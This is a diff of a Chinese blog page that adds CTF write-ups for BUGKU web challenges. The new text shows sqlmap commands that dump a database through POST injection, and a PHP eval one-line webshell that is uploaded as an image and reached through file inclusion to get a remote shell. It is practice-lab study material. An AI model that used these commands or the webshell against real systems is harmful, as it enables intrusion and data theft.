@@ -463,21 +463,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-12-31
+                    2021-01-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    7 分
                 </div>
                 
 
@@ -568,6 +568,39 @@
 </blockquote>
 <p>因为数组的原因，我们在数组后面的等号写什么都可以。<br>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bad_Monkey/article/details/100935748">数组绕过及php语言的特性</a></p>
 <p>这两种方法都可以绕过==md5的情况，成功得到flag</p>
+<h2 id="BUGKU-Web17"><a href="#BUGKU-Web17" class="headerlink" title="BUGKU Web17"></a>BUGKU Web17</h2><p>打开网址，发现是一个成绩查询的页面，输入1,2，3分别可以查询三个人的成绩，<br><img src="https://img-blog.csdnimg.cn/20201231135338997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>肯定是考察post注入，用sqlmap比较方便。<br>首先用bp抓包，确定参数为id<br><img src="https://img-blog.csdnimg.cn/2020123113564035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用sqlmap构建语句进行爆破数据库</p>
+<blockquote>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://114.67.246.176:12067/index.php">http://114.67.246.176:12067/index.php</a> –data “id=1” –dbs</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2020123113593478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>爆破得到四个数据库，猜测flag在test中<br>继续爆破表</p>
+<blockquote>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://114.67.246.176:12067/index.php">http://114.67.246.176:12067/index.php</a> –data “id=1” -D test –tables</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20201231140406321.png"></p>
+<p>发现这个数据库里面没有表，没关系，换一个继续爆破</p>
+<blockquote>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://114.67.246.176:12067/index.php">http://114.67.246.176:12067/index.php</a> –data “id=1” -D skctf –tables</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20201231141008775.png"><br>一看就知道flag在fl4g这个表里面，于是直接将这个表输出</p>
+<blockquote>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://114.67.246.176:12067/index.php">http://114.67.246.176:12067/index.php</a> –data “id=1” -D skctf -T fl4g –dump</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20201231141836529.png"><br>得到flag。<br>sqlmap真好用~~</p>
+<h2 id="第五天：BUGKU-Web34-2021-01-01"><a href="#第五天：BUGKU-Web34-2021-01-01" class="headerlink" title="第五天：BUGKU Web34(2021.01.01)"></a>第五天：BUGKU Web34(2021.01.01)</h2><p><img src="https://img-blog.csdnimg.cn/20210101205923561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>提示说文件包含，那肯定是有文件包含漏洞，先打开环境<br><img src="https://img-blog.csdnimg.cn/20210101211003669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://114.67.246.176:18136/index.php?file=hello.php">http://114.67.246.176:18136/index.php?file=hello.php</a></p>
+</blockquote>
+<p>网页表面看不出什么有效信息，url看样子就是文件包含的格式，但是后面怎么改还不知道。于是查看源码：<br><img src="https://img-blog.csdnimg.cn/20210101211148253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>一大串代码看不懂，但是发现了这个bookmarks.html,感觉可以试试，于是在url后面将hello.php改为bookmarks.html</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://114.67.246.176:18136/index.php?file=bookmarks.html">http://114.67.246.176:18136/index.php?file=bookmarks.html</a></p>
+</blockquote>
+<p>访问后页面什么都没有，查看源代码<br><img src="https://img-blog.csdnimg.cn/20210101212100308.png"><br>发现upload.php<br>于是再将url后面改成upload.php，发现文件上传的地方。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://114.67.246.176:18136/index.php?file=upload.php">http://114.67.246.176:18136/index.php?file=upload.php</a></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210101212237609.png"><br>接下来就是尝试上传一句话木马并且菜刀连接了。<br>用bp抓包进行测试，可以看到，虽然用普通的一句话木马写的图片成功上传上去了，但是返回的包里php代码被过滤了，所以一句话木马是不会被执行的。<br><img src="https://img-blog.csdnimg.cn/20210101212729128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后也不是很懂，用这道题的评论区里有一个大佬给的代码成功连接了，具体还不是很懂，应该是文件包含漏洞和文件上传漏洞结合产生的一个独特的代码。评论区的大佬说这道题必须结合文件包含漏洞才能连接上，我试了好几种一句话木马确实都没有连上。</p>
+<pre><code>&lt;script language=php&gt;echo 'a'; eval($_POST['pass']);&lt;/script&gt;</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210101220404316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>这里还需要注意一点：地址也必须用文件包含的格式，图片地址要放到file=的后面，才能连接上。<br>菜刀连接，在根目录下得到flag。</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1138,7 +1171,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">21.5k</span>&nbsp;字
+                class="white-color">22.1k</span>&nbsp;字
             
             
             
